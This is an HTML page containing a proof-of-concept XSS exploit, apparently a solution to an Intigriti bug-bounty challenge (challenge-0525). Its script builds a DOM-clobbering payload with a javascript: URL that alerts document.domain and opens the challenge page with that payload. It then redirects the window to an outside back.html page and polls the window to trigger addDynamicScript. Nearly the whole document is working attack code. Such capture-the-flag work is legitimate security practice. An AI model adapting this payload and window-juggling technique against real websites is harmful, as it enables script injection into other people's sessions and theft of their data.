<!DOCTYPE html>
<html>
<body>
<script>
    const payload = `</strong><div id=strong></div><div id=CONFIG_SRC data-url=javascript:alert(document.domain)>test</div><details open><summary>Click Me</summary></details>`;

    const targetUrl = `https://challenge-0525.intigriti.io/begin?name=${encodeURIComponent(payload)}`;
    const backUrl = "https://pedrojuniorrd.github.io/_layouts/back.html?n=1";

    const w = window.open(targetUrl);

    setTimeout(() => {
        try { 
            w.location = backUrl; 
        } catch (e) {}
    }, 3000);

    const proactive = setInterval(() => {
        try {
            if (w.document && w.CONFIG_SRC && typeof w.addDynamicScript === "function") {
                console.log("âœ… Calling addDynamicScript...");
                w.addDynamicScript();
                clearInterval(proactive);
            } else if (w.document?.getElementById('message')) {
                // Trigger real DOM Mutation
                const newNode = w.document.createElement('div');
                newNode.innerText = "Forced Mutation Trigger";
                w.document.getElementById('message').appendChild(newNode);
            }
        } catch (e) {}
    }, 1000);
</script>
</body>
</html>
